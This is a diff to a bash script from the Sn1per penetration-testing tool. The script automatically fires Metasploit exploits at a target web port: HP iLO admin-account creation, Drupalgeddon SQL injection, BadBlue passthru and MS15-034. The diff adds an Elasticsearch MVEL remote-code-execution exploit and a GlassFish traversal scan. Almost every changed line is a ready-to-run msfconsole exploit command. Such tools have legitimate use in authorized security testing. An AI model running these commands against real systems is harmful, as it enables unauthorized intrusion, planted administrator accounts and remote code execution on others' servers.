@@ -26,7 +26,7 @@ if [ "$MODE" = "webporthttps" ]; then
   echo -e "$OKRED               /_/                 $RESET"
   echo -e "$RESET"
   echo -e "$OKORANGE + -- --=[https://xerosecurity.com"
-  echo -e "$OKORANGE + -- --=[sniper v$VER by 1N3"
+  echo -e "$OKORANGE + -- --=[Sn1per v$VER by 1N3"
   echo -e ""
   echo -e ""
   echo -e "               ;               ,           "
@@ -272,15 +272,37 @@ if [ "$MODE" = "webporthttps" ]; then
       echo -e "${OKGREEN}====================================================================================${RESET}"
       echo -e "$OKRED RUNNING HP ILO AUTH BYPASS EXPLOIT $RESET"
       echo -e "${OKGREEN}====================================================================================${RESET}"
-      msfconsole -q -x "use admin/hp/hp_ilo_create_admin_account; setg RHOST "$TARGET"; setg RPORT "$PORT"; set SSL true; set SSL false; run; exit;"  | tee $LOOT_DIR/output/msf-$TARGET--port80-hp_ilo_create_admin_account.raw
-      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET--port80-hp_ilo_create_admin_account.raw > $LOOT_DIR/output/msf-$TARGET--port80-hp_ilo_create_admin_account.txt 2> /dev/null
-      rm -f $LOOT_DIR/output/msf-$TARGET--port80-hp_ilo_create_admin_account.raw 2> /dev/null
+      msfconsole -q -x "use admin/hp/hp_ilo_create_admin_account; setg RHOST "$TARGET"; setg RPORT "$PORT"; set SSL true; set SSL false; run; exit;"  | tee $LOOT_DIR/output/msf-$TARGET-port80-hp_ilo_create_admin_account.raw
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port80-hp_ilo_create_admin_account.raw > $LOOT_DIR/output/msf-$TARGET-port80-hp_ilo_create_admin_account.txt 2> /dev/null
+      rm -f $LOOT_DIR/output/msf-$TARGET-port80-hp_ilo_create_admin_account.raw 2> /dev/null
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING ELASTICSEARCH DYNAMIC SCRIPT JAVA INJECTION EXPLOIT $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      msfconsole -q -x "use exploit/multi/elasticsearch/script_mvel_rce; setg RHOST "$TARGET"; setg RPORT "$PORT"; set SSL true; run; exit;"  | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-script_mvel_rce.raw
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-script_mvel_rce.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-script_mvel_rce.txt 2> /dev/null
+      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-script_mvel_rce.raw 2> /dev/null
       echo -e "${OKGREEN}====================================================================================${RESET}"
       echo -e "$OKRED RUNNING DRUPALGEDDON HTTP PARAMETER SQL INJECTION CVE-2014-3704 $RESET"
       echo -e "${OKGREEN}====================================================================================${RESET}"
       msfconsole -q -x "use exploit/multi/http/drupal_drupageddon; setg RHOST "$TARGET"; setg RPORT "$PORT"; set SSL true; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_drupageddon.raw
       sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_drupageddon.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_drupageddon.txt 2> /dev/null
       rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-drupal_drupageddon.raw 2> /dev/null
+
+
+
+
+
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      echo -e "$OKRED RUNNING GLASSFISH ADMIN TRAVERSAL EXPLOIT $RESET"
+      echo -e "${OKGREEN}====================================================================================${RESET}"
+      msfconsole -q -x "use scanner/http/glassfish_traversal; setg RHOSTS "$TARGET"; setg RPORT "$PORT"; set SSL true; run; exit;" | tee $LOOT_DIR/output/msf-$TARGET-port$PORT-glassfish_traversal.raw
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port$PORT-glassfish_traversal.raw > $LOOT_DIR/output/msf-$TARGET-port$PORT-glassfish_traversal.txt 2> /dev/null
+      rm -f $LOOT_DIR/output/msf-$TARGET-port$PORT-glassfish_traversal.raw 2> /dev/null
+
+
+
+
+        
       echo -e "${OKGREEN}====================================================================================${RESET}"
       echo -e "$OKRED RUNNING MS15-034 SYS MEMORY DUMP METASPLOIT EXPLOIT $RESET"
       echo -e "${OKGREEN}====================================================================================${RESET}"
@@ -290,9 +312,9 @@ if [ "$MODE" = "webporthttps" ]; then
       echo -e "${OKGREEN}====================================================================================${RESET}"
       echo -e "$OKRED RUNNING BADBLUE PASSTHRU METASPLOIT EXPLOIT $RESET"
       echo -e "${OKGREEN}====================================================================================${RESET}"
-      msfconsole -q -x "use exploit/windows/http/badblue_passthru; setg RHOST "$TARGET"; set RPORT 80; run; back;exit;" | tee $LOOT_DIR/output/msf-$TARGET--port80-badblue_passthru.raw
-      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET--port80-badblue_passthru.raw > $LOOT_DIR/output/msf-$TARGET--port80-badblue_passthru.txt 2> /dev/null
-      rm -f $LOOT_DIR/output/msf-$TARGET--port80-badblue_passthru.raw 2> /dev/null
+      msfconsole -q -x "use exploit/windows/http/badblue_passthru; setg RHOST "$TARGET"; set RPORT 80; run; back;exit;" | tee $LOOT_DIR/output/msf-$TARGET-port80-badblue_passthru.raw
+      sed -r "s/\x1B\[([0-9]{1,2}(;[0-9]{1,2})?)?[mGK]//g" $LOOT_DIR/output/msf-$TARGET-port80-badblue_passthru.raw > $LOOT_DIR/output/msf-$TARGET-port80-badblue_passthru.txt 2> /dev/null
+      rm -f $LOOT_DIR/output/msf-$TARGET-port80-badblue_passthru.raw 2> /dev/null
       echo -e "${OKGREEN}====================================================================================${RESET}"
       echo -e "$OKRED RUNNING PHP CGI ARG INJECTION METASPLOIT EXPLOIT $RESET"
       echo -e "${OKGREEN}====================================================================================${RESET}"
